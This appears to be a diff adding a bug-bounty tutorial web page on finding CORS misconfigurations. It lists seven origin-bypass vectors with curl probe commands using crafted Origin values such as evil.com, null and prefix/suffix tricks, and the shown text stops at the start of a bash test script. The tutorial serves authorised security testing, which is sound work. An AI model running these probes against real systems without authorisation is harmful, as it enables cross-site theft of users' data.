@@ -1,0 +1,1411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How to Find CORS Misconfigurations in Bug Bounties (2026) — The Complete Methodology</title>
+  <meta name="description" content="Learn how to find CORS misconfigurations in bug bounty programs. 7 bypass vectors, curl one-liners, automation scripts, and report-writing tips for 2026.">
+  <meta name="keywords" content="cors misconfiguration bug bounty, how to find cors vulnerabilities, cors security testing, cors bypass techniques, bug bounty cors, cors pentesting guide 2026">
+  <link rel="canonical" href="https://blog.valooptimise.com/posts/how-to-find-cors-misconfigurations-bug-bounty-guide-2026.html">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="How to Find CORS Misconfigurations in Bug Bounties (2026) — The Complete Methodology">
+  <meta property="og:description" content="7 CORS bypass vectors, curl one-liners, automation at scale, and report-writing tips that get payouts.">
+  <meta property="og:image" content="https://valooptimise.com/docs/assets/og-image.png">
+  <meta property="og:url" content="https://blog.valooptimise.com/posts/how-to-find-cors-misconfigurations-bug-bounty-guide-2026.html">
+  <meta property="og:site_name" content="Valo Optimise Blog">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="How to Find CORS Misconfigurations in Bug Bounties (2026)">
+  <meta name="twitter:description" content="7 CORS bypass vectors, curl one-liners, automation at scale, and report-writing tips.">
+  <meta name="twitter:image" content="https://valooptimise.com/docs/assets/og-image.png">
+
+  <!-- Schema: Article -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "How to Find CORS Misconfigurations in Bug Bounties (2026) — The Complete Methodology",
+    "description": "Learn how to find CORS misconfigurations in bug bounty programs. 7 bypass vectors, curl one-liners, automation scripts, and report-writing tips.",
+    "image": "https://valooptimise.com/docs/assets/og-image.png",
+    "author": { "@type": "Person", "name": "Harvey Jenkins" },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Valo Optimise",
+      "logo": { "@type": "ImageObject", "url": "https://valooptimise.com/docs/assets/icon_256.png" }
+    },
+    "datePublished": "2026-03-28",
+    "dateModified": "2026-03-28",
+    "mainEntityOfPage": "https://blog.valooptimise.com/posts/how-to-find-cors-misconfigurations-bug-bounty-guide-2026.html"
+  }
+  </script>
+
+  <link rel="icon" href="https://valooptimise.com/docs/assets/icon_256.png">
+
+  <!-- Google AdSense -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4629819662160550" crossorigin="anonymous"></script>
+
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --panel: #111827;
+      --panel2: #1c2a3a;
+      --accent: #ff4655;
+      --accent2: #00d4aa;
+      --text: #f0f4ff;
+      --muted: #6b7a99;
+      --border: #1e2d42;
+      --warn: #f59e0b;
+      --font: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      --radius: 10px;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      line-height: 1.7;
+      font-size: 16px;
+    }
+
+    /* ── Progress Bar ─────────────────────────────────────────── */
+    #progress-bar {
+      position: fixed;
+      top: 0; left: 0;
+      height: 3px;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      z-index: 9999;
+      transition: width 0.1s linear;
+    }
+
+    /* ── Nav ──────────────────────────────────────────────────── */
+    nav {
+      position: sticky;
+      top: 0;
+      background: rgba(10,14,26,0.95);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      z-index: 100;
+    }
+
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: var(--text);
+      font-weight: 700;
+      font-size: 15px;
+    }
+
+    .nav-logo span { color: var(--accent); }
+
+    .nav-links { display: flex; align-items: center; gap: 20px; }
+
+    .nav-links a {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.2s;
+    }
+
+    .nav-links a:hover { color: var(--text); }
+
+    .nav-cta {
+      background: var(--accent);
+      color: #fff !important;
+      padding: 8px 18px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 13px !important;
+      transition: background 0.2s, transform 0.2s !important;
+    }
+
+    .nav-cta:hover, .nav-cta:focus-visible { background: #e63946 !important; transform: translateY(-1px); }
+    .nav-cta:focus-visible { outline: 2px solid var(--accent2); outline-offset: 2px; }
+
+    /* ── Article Hero ─────────────────────────────────────────── */
+    .article-hero {
+      max-width: 800px;
+      margin: 48px auto 0;
+      padding: 0 24px;
+    }
+
+    .tags { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
+
+    .tag {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      color: var(--accent2);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 20px;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    .article-hero h1 {
+      font-size: clamp(24px, 4vw, 38px);
+      line-height: 1.25;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      margin-bottom: 16px;
+      color: var(--text);
+    }
+
+    .article-hero h1 em {
+      font-style: normal;
+      color: var(--accent);
+    }
+
+    .article-meta {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      color: var(--muted);
+      font-size: 14px;
+      margin-bottom: 32px;
+      flex-wrap: wrap;
+    }
+
+    .article-meta .dot { opacity: 0.4; }
+
+    .read-time {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 3px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--accent2);
+    }
+
+    /* ── Layout ───────────────────────────────────────────────── */
+    .article-layout {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 24px 80px;
+      display: grid;
+      grid-template-columns: 240px 1fr;
+      gap: 48px;
+      align-items: start;
+    }
+
+    /* ── TOC ──────────────────────────────────────────────────── */
+    .toc {
+      position: sticky;
+      top: 72px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px;
+    }
+
+    .toc-title {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin-bottom: 14px;
+    }
+
+    .toc ol { list-style: none; counter-reset: toc; }
+
+    .toc ol li {
+      counter-increment: toc;
+      margin-bottom: 6px;
+    }
+
+    .toc ol li a {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 13px;
+      line-height: 1.4;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: background 0.15s, color 0.15s;
+    }
+
+    .toc ol li a::before {
+      content: counter(toc);
+      background: var(--panel2);
+      color: var(--accent);
+      font-size: 10px;
+      font-weight: 700;
+      min-width: 18px;
+      height: 18px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 1px;
+    }
+
+    .toc ol li a:hover,
+    .toc ol li a:focus-visible,
+    .toc ol li a.active {
+      background: var(--panel2);
+      color: var(--text);
+    }
+
+    .toc ol li a:focus-visible { outline: 2px solid var(--accent2); outline-offset: 2px; }
+
+    .toc ol li a.active::before { background: var(--accent); color: #fff; }
+
+    .toc-cta {
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+    }
+
+    .toc-cta a {
+      display: block;
+      background: var(--accent);
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 700;
+      text-decoration: none;
+      transition: background 0.2s;
+    }
+
+    .toc-cta a:hover, .toc-cta a:focus-visible { background: #e63946; }
+    .toc-cta a:focus-visible { outline: 2px solid var(--accent2); outline-offset: 2px; }
+
+    /* ── Article Body ─────────────────────────────────────────── */
+    article { min-width: 0; }
+
+    .article-intro {
+      font-size: 17px;
+      line-height: 1.8;
+      color: #c8d0e0;
+      margin-bottom: 32px;
+      padding: 24px;
+      background: var(--panel);
+      border-radius: var(--radius);
+      border-left: 3px solid var(--accent);
+    }
+
+    .article-intro strong { color: var(--text); }
+
+    .section-block {
+      margin-bottom: 48px;
+      scroll-margin-top: 80px;
+    }
+
+    .section-block h2 {
+      font-size: 22px;
+      font-weight: 700;
+      line-height: 1.3;
+      color: var(--text);
+      margin-bottom: 16px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .section-block h2 .num {
+      color: var(--accent);
+      font-size: 14px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .section-block h3 {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text);
+      margin-top: 28px;
+      margin-bottom: 12px;
+    }
+
+    .section-block p {
+      color: #c8d0e0;
+      margin-bottom: 14px;
+      line-height: 1.8;
+    }
+
+    .section-block ul, .section-block ol {
+      margin: 14px 0 14px 24px;
+      color: #c8d0e0;
+      line-height: 1.8;
+    }
+
+    .section-block ul li, .section-block ol li {
+      margin-bottom: 8px;
+    }
+
+    .section-block strong { color: var(--text); }
+
+    .section-block code {
+      background: var(--panel2);
+      padding: 2px 7px;
+      border-radius: 4px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 14px;
+      color: var(--accent2);
+    }
+
+    /* Code blocks */
+    .code-block {
+      background: #070b14;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px 20px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 13px;
+      color: var(--accent2);
+      margin: 16px 0;
+      overflow-x: auto;
+      position: relative;
+      white-space: pre;
+      line-height: 1.6;
+    }
+
+    .code-block .copy-code {
+      position: absolute;
+      top: 10px; right: 10px;
+      background: var(--panel2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: var(--font);
+      transition: color 0.2s;
+    }
+
+    .code-block .copy-code:hover { color: var(--text); }
+
+    .code-block .code-label {
+      display: block;
+      color: var(--muted);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 10px;
+      font-family: var(--font);
+      font-weight: 600;
+    }
+
+    .code-block .comment { color: var(--muted); }
+    .code-block .string { color: #f59e0b; }
+    .code-block .keyword { color: var(--accent); }
+
+    /* Callout boxes */
+    .callout-box {
+      background: rgba(0, 212, 170, 0.08);
+      border: 1px solid rgba(0, 212, 170, 0.25);
+      border-left: 3px solid var(--accent2);
+      border-radius: var(--radius);
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .callout-box strong {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 15px;
+      color: var(--accent2);
+    }
+
+    .callout-box p {
+      font-size: 14px;
+      line-height: 1.7;
+      color: #c8d0e0;
+      margin-bottom: 0;
+    }
+
+    /* Warning boxes */
+    .warn-box {
+      background: rgba(245, 158, 11, 0.08);
+      border: 1px solid rgba(245, 158, 11, 0.25);
+      border-left: 3px solid var(--warn);
+      border-radius: var(--radius);
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .warn-box strong {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 15px;
+      color: var(--warn);
+    }
+
+    .warn-box p {
+      font-size: 14px;
+      line-height: 1.7;
+      color: #c8d0e0;
+      margin-bottom: 0;
+    }
+
+    /* Ad breaks */
+    .ad-break {
+      margin: 32px 0;
+      text-align: center;
+    }
+
+    /* HR divider */
+    .section-divider {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 40px 0;
+    }
+
+    /* Author card */
+    .author-card {
+      display: flex;
+      gap: 20px;
+      align-items: flex-start;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+      margin: 48px 0;
+    }
+
+    .author-avatar {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: 800;
+      color: #fff;
+      flex-shrink: 0;
+    }
+
+    .author-info h4 {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+
+    .author-info .author-role {
+      font-size: 13px;
+      color: var(--accent2);
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .author-info p {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    /* Final CTA */
+    .final-cta {
+      background: linear-gradient(135deg, #0f1824, #1a0d10);
+      border: 1px solid rgba(255,70,85,0.3);
+      border-radius: 14px;
+      padding: 36px;
+      margin: 48px 0;
+      text-align: center;
+    }
+
+    .final-cta h2 {
+      font-size: 26px;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
+
+    .final-cta h2 em { font-style: normal; color: var(--accent); }
+
+    .final-cta p {
+      color: var(--muted);
+      font-size: 15px;
+      margin-bottom: 24px;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .cta-btn {
+      display: inline-block;
+      background: var(--accent);
+      color: #fff;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 700;
+      padding: 14px 36px;
+      border-radius: 8px;
+      transition: background 0.2s, transform 0.2s;
+    }
+
+    .cta-btn:hover, .cta-btn:focus-visible { background: #e63946; transform: translateY(-2px); }
+    .cta-btn:focus-visible { outline: 2px solid var(--accent2); outline-offset: 2px; }
+
+    .cta-sub { font-size: 13px; color: var(--muted); margin-top: 12px; }
+
+    /* Share section */
+    .share-section {
+      margin: 48px 0;
+      padding: 28px;
+      background: var(--panel);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      text-align: center;
+    }
+
+    .share-section h3 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .share-section p {
+      color: var(--muted);
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .share-btns {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .share-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      font-family: var(--font);
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.2s;
+      text-decoration: none;
+    }
+
+    .share-btn:hover, .share-btn:focus-visible { opacity: 0.85; transform: translateY(-1px); }
+    .share-btn:focus-visible { outline: 2px solid var(--accent2); outline-offset: 2px; }
+
+    .share-btn.twitter { background: #1da1f2; color: #fff; }
+    .share-btn.reddit  { background: #ff4500; color: #fff; }
+    .share-btn.copy    { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
+
+    /* Floating CTA */
+    #floating-cta {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: var(--accent);
+      color: #fff;
+      padding: 14px 22px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+      box-shadow: 0 4px 24px rgba(255,70,85,0.4);
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.3s, transform 0.3s;
+      pointer-events: none;
+      z-index: 200;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    #floating-cta.visible { opacity: 1; transform: translateY(0); pointer-events: all; }
+    #floating-cta:hover { background: #e63946; }
+
+    /* Related articles */
+    .related-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 16px;
+      margin-top: 20px;
+    }
+
+    .related-card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px;
+      text-decoration: none;
+      transition: border-color 0.2s, transform 0.2s;
+    }
+
+    .related-card:hover { border-color: var(--accent2); transform: translateY(-2px); }
+
+    .related-card .tag { margin-bottom: 10px; }
+
+    .related-card h4 { font-size: 15px; font-weight: 700; color: var(--text); margin-bottom: 6px; line-height: 1.4; }
+
+    .related-card p { font-size: 13px; color: var(--muted); }
+
+    /* Footer */
+    footer {
+      background: var(--panel);
+      border-top: 1px solid var(--border);
+      padding: 32px 24px;
+      text-align: center;
+      margin-top: 80px;
+    }
+
+    footer a { color: var(--accent2); text-decoration: none; }
+    footer p { color: var(--muted); font-size: 13px; }
+
+    /* Responsive */
+    @media (max-width: 860px) {
+      .article-layout {
+        grid-template-columns: 1fr;
+      }
+
+      .toc { position: static; }
+    }
+
+    @media (max-width: 600px) {
+      .article-hero h1 { font-size: 24px; }
+      .nav-links .nav-cta { display: flex; }
+      .nav-links a:not(.nav-cta) { display: none; }
+      .author-card { flex-direction: column; align-items: center; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Reading progress bar -->
+<div id="progress-bar"></div>
+
+<!-- Nav -->
+<nav role="navigation" aria-label="Main navigation">
+  <a href="../index.html" class="nav-logo">
+    <span>VALO</span> OPTIMISE BLOG
+  </a>
+  <div class="nav-links">
+    <a href="../index.html">All Posts</a>
+    <a href="https://valooptimise.com" target="_blank" rel="noopener noreferrer" class="nav-cta">Download Valo Optimise</a>
+  </div>
+</nav>
+
+<!-- Article hero -->
+<div class="article-hero">
+  <div class="tags">
+    <span class="tag">Bug Bounty</span>
+    <span class="tag">CORS</span>
+    <span class="tag">Web Security</span>
+    <span class="tag">2026</span>
+  </div>
+
+  <h1>How to Find CORS Misconfigurations in Bug Bounties (2026) — <em>The Complete Methodology</em></h1>
+
+  <div class="article-meta">
+    <span>March 28, 2026</span>
+    <span class="dot">&middot;</span>
+    <span>Harvey Jenkins</span>
+    <span class="dot">&middot;</span>
+    <span class="read-time">~12 min read</span>
+  </div>
+</div>
+
+<!-- Article layout -->
+<div class="article-layout">
+
+  <!-- Sticky TOC -->
+  <aside class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#section-1">What Is CORS and Why It Matters</a></li>
+      <li><a href="#section-2">The 7 CORS Bypass Vectors</a></li>
+      <li><a href="#section-3">Wildcard vs Reflected: Severity</a></li>
+      <li><a href="#section-4">Building a One-Liner Scanner</a></li>
+      <li><a href="#section-5">Automating at Scale</a></li>
+      <li><a href="#section-6">Writing a High-Quality Report</a></li>
+      <li><a href="#section-7">Common False Positives</a></li>
+      <li><a href="#section-8">Real-World Impact Scenarios</a></li>
+    </ol>
+    <div class="toc-cta">
+      <a href="https://valooptimise.com" target="_blank" rel="noopener noreferrer">Download Valo Optimise</a>
+    </div>
+  </aside>
+
+  <!-- Main article -->
+  <article>
+
+    <div class="article-intro">
+      <strong>CORS misconfigurations remain one of the most consistently rewarded vulnerability classes in bug bounty programs.</strong> They are everywhere, they are often high-severity, and most hunters either test for them incorrectly or miss them entirely. This guide covers the exact methodology — from first request to final report — that turns CORS testing from guesswork into a repeatable process.
+    </div>
+
+    <!-- Ad: below intro -->
+    <div class="ad-break">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-4629819662160550"
+           data-ad-slot="auto"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+
+    <!-- ── SECTION 1 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-1">
+      <h2><span class="num">Section 01</span>What Is CORS and Why Does It Matter for Security?</h2>
+
+      <p>Cross-Origin Resource Sharing (CORS) is a browser mechanism that allows a web server to indicate which origins (domains, schemes, or ports) other than its own are permitted to read its responses. Without CORS, the browser's <strong>Same-Origin Policy (SOP)</strong> would block all cross-origin reads by default.</p>
+
+      <p>Here is the problem: when a server dynamically reflects the requesting origin in its <code>Access-Control-Allow-Origin</code> (ACAO) header — especially alongside <code>Access-Control-Allow-Credentials: true</code> — it effectively disables the Same-Origin Policy for any origin that asks. An attacker hosting a malicious page can make authenticated requests to the vulnerable API and read the response, stealing user data, tokens, or session information.</p>
+
+      <p>The core headers you need to understand:</p>
+
+      <ul>
+        <li><code>Access-Control-Allow-Origin</code> (ACAO) — tells the browser which origin is allowed to read the response</li>
+        <li><code>Access-Control-Allow-Credentials</code> (ACAC) — when <code>true</code>, the browser sends cookies/auth headers with the cross-origin request</li>
+        <li><code>Access-Control-Allow-Methods</code> — which HTTP methods are permitted</li>
+        <li><code>Access-Control-Allow-Headers</code> — which custom headers the client can send</li>
+      </ul>
+
+      <div class="callout-box">
+        <strong>Pro Tip: Why CORS bugs pay well</strong>
+        <p>A CORS misconfiguration on an authenticated API endpoint is functionally equivalent to a stored XSS in terms of impact — it gives an attacker full read access to a victim's data. Triagers and companies understand this, which is why well-written CORS reports consistently earn medium-to-high payouts.</p>
+      </div>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 2 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-2">
+      <h2><span class="num">Section 02</span>The 7 CORS Bypass Vectors Every Hunter Should Test</h2>
+
+      <p>Most applications do not blindly reflect any origin. Instead, they implement validation logic — an allowlist, a regex, or a prefix/suffix check. Each of these can be bypassed in specific ways. Here are the seven vectors you should test on every target.</p>
+
+      <h3>1. Arbitrary Origin Reflection</h3>
+
+      <p>The simplest and most severe case. The server reflects whatever value you send in the <code>Origin</code> header directly into the ACAO response header, without any validation.</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: Arbitrary Origin Reflection</span>curl -s -I -H "Origin: https://evil.com" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># Look for:</span>
+<span class="comment"># Access-Control-Allow-Origin: https://evil.com</span>
+<span class="comment"># Access-Control-Allow-Credentials: true</span></div>
+
+      <p>If the server returns your attacker-controlled origin along with credentials allowed, this is a <strong>critical</strong> finding. Any authenticated endpoint becomes exploitable.</p>
+
+      <h3>2. Null Origin</h3>
+
+      <p>Some applications whitelist the special <code>null</code> origin. This is dangerous because an attacker can trigger a <code>null</code> origin from a sandboxed iframe, a <code>data:</code> URI, or a local file — all common attack scenarios.</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: Null Origin</span>curl -s -I -H "Origin: null" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># Look for:</span>
+<span class="comment"># Access-Control-Allow-Origin: null</span>
+<span class="comment"># Access-Control-Allow-Credentials: true</span></div>
+
+      <div class="warn-box">
+        <strong>Common mistake: many hunters skip null origin testing</strong>
+        <p>The null origin bypass is easy to miss because it does not look like a "real" origin. But it is one of the most exploitable vectors — sandboxed iframes reliably produce a null origin in all modern browsers.</p>
+      </div>
+
+      <h3>3. HTTP Downgrade (Scheme Bypass)</h3>
+
+      <p>If the target is HTTPS, test whether the CORS validation accepts the HTTP version of a trusted origin. Many regex patterns check the domain but not the scheme.</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: HTTP Downgrade</span>curl -s -I -H "Origin: http://trusted.example.com" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># If the app trusts https://trusted.example.com</span>
+<span class="comment"># but also accepts http://trusted.example.com</span>
+<span class="comment"># → MitM on the trusted domain = CORS bypass</span></div>
+
+      <p>This is exploitable in any scenario where the attacker has network position (public WiFi, ISP-level interception, compromised router). The attacker MitMs the HTTP origin to serve the malicious JavaScript.</p>
+
+      <h3>4. Subdomain Wildcard / Spoofing</h3>
+
+      <p>When a server trusts all subdomains (e.g., <code>*.example.com</code>), any XSS on any subdomain becomes a full CORS bypass. Test whether arbitrary subdomains are accepted:</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: Subdomain Wildcard</span>curl -s -I -H "Origin: https://evil.example.com" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># Also try deep subdomains:</span>
+curl -s -I -H "Origin: https://anything.subdomain.example.com" \
+  https://api.example.com/v1/user/profile</div>
+
+      <div class="callout-box">
+        <strong>Pro Tip: Chain with subdomain takeover</strong>
+        <p>If you find a CORS policy that trusts all subdomains AND you find a dangling DNS record (subdomain takeover), the two chain into a high-severity exploit. The takeover gives you control of a "trusted" origin.</p>
+      </div>
+
+      <h3>5. Prefix Match Bypass</h3>
+
+      <p>Some validation logic checks whether the origin <em>starts with</em> a trusted domain. This can be bypassed by registering a domain that begins with the trusted domain string:</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: Prefix Match</span><span class="comment"># If the server trusts origins starting with "example.com"</span>
+curl -s -I -H "Origin: https://example.com.evil.com" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># The server sees "example.com" at the start and allows it</span>
+<span class="comment"># But the actual domain is evil.com</span></div>
+
+      <h3>6. Suffix Match Bypass</h3>
+
+      <p>The inverse of prefix matching. The server checks if the origin <em>ends with</em> a trusted domain. An attacker registers a domain ending in the same string:</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: Suffix Match</span><span class="comment"># If the server trusts origins ending in "example.com"</span>
+curl -s -I -H "Origin: https://notexample.com" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># Or with a hyphen trick:</span>
+curl -s -I -H "Origin: https://evil-example.com" \
+  https://api.example.com/v1/user/profile</div>
+
+      <h3>7. Backtick / Special Character Bypass</h3>
+
+      <p>Some origin validation fails when encountering special characters. The backtick (<code>`</code>) is notable because certain server-side parsers truncate or mishandle it, causing the validation to pass on a crafted origin:</p>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Test: Backtick Bypass</span>curl -s -I -H "Origin: https://example.com%60.evil.com" \
+  https://api.example.com/v1/user/profile
+
+<span class="comment"># Also try other special characters:</span>
+curl -s -I -H "Origin: https://example.com'.evil.com" \
+  https://api.example.com/v1/user/profile
+
+curl -s -I -H "Origin: https://example.com!.evil.com" \
+  https://api.example.com/v1/user/profile</div>
+
+      <div class="warn-box">
+        <strong>Browser compatibility matters</strong>
+        <p>Not all special character bypasses work in every browser. Always verify your PoC in Chrome, Firefox, and Safari. A bypass that only works in curl but not in a real browser is not exploitable and will be marked as informational or N/A.</p>
+      </div>
+    </div>
+
+    <!-- Ad: after section 2 -->
+    <div class="ad-break">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-4629819662160550"
+           data-ad-slot="auto"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 3 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-3">
+      <h2><span class="num">Section 03</span>Wildcard vs Reflected: Why Severity Matters</h2>
+
+      <p>This is the single most important distinction in CORS testing, and the one that trips up more hunters than anything else. Not all CORS "misconfigurations" are equal.</p>
+
+      <h3>Scenario A: ACAO: * (Wildcard)</h3>
+
+      <p>When a server returns <code>Access-Control-Allow-Origin: *</code>, it allows any origin to read the response. Sounds bad, right? Here is the catch: <strong>browsers will not send credentials (cookies, auth headers) with a wildcard ACAO.</strong> The browser enforces that <code>ACAO: *</code> and <code>ACAC: true</code> cannot coexist — the request will fail.</p>
+
+      <p>This means a wildcard CORS configuration is only exploitable if the endpoint returns sensitive data without requiring authentication (e.g., internal API endpoints that rely on network-level access control instead of auth tokens). In most bug bounty contexts, this is <strong>medium severity at best</strong> and often informational.</p>
+
+      <h3>Scenario B: Reflected Origin + Credentials</h3>
+
+      <p>When a server reflects the exact <code>Origin</code> header value into the ACAO and sets <code>ACAC: true</code>, the browser <em>will</em> send cookies. This means an attacker's malicious page can make an authenticated request and read the full response — account data, tokens, PII, everything.</p>
+
+      <p>This is <strong>high severity</strong>. It is functionally equivalent to cross-site data theft.</p>
+
+      <div class="callout-box">
+        <strong>Pro Tip: How to explain this in reports</strong>
+        <p>When you find a reflected origin + credentials case, frame your impact section around what specific data the attacker can steal. "This endpoint returns the user's email, full name, billing address, and API keys" hits much harder than "CORS misconfiguration allows cross-origin reads." Be specific.</p>
+      </div>
+
+      <div class="warn-box">
+        <strong>Do not report ACAO: * alone as high severity</strong>
+        <p>Submitting a wildcard ACAO finding as a high/critical bug is one of the fastest ways to get marked as "not applicable" and damage your reputation with a program. Always check whether credentials are sent and whether the data returned requires authentication.</p>
+      </div>
+
+      <h3>Quick Severity Reference</h3>
+
+      <div class="code-block"><span class="code-label">CORS Severity Cheat Sheet</span>ACAO: *                  + No credentials  = Low/Info (unless sensitive unauthenticated data)
+ACAO: *                  + ACAC: true      = Browser blocks it (not exploitable)
+ACAO: [reflected origin] + No credentials  = Low (no auth = limited impact)
+ACAO: [reflected origin] + ACAC: true      = High/Critical (full authenticated data theft)
+ACAO: null               + ACAC: true      = High (exploitable via sandboxed iframe)</div>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 4 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-4">
+      <h2><span class="num">Section 04</span>Building a One-Liner Scanner (curl Examples)</h2>
+
+      <p>Before automating, you need to understand what each test looks like as a single request. Here is a complete curl-based testing methodology. All examples target fictional endpoints — replace with your actual in-scope target.</p>
+
+      <h3>The Complete Test Suite</h3>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Bash: Full CORS Test Suite</span><span class="comment">#!/bin/bash</span>
+<span class="comment"># CORS Misconfiguration Test Suite</span>
+<span class="comment"># Replace TARGET with your in-scope endpoint</span>
+
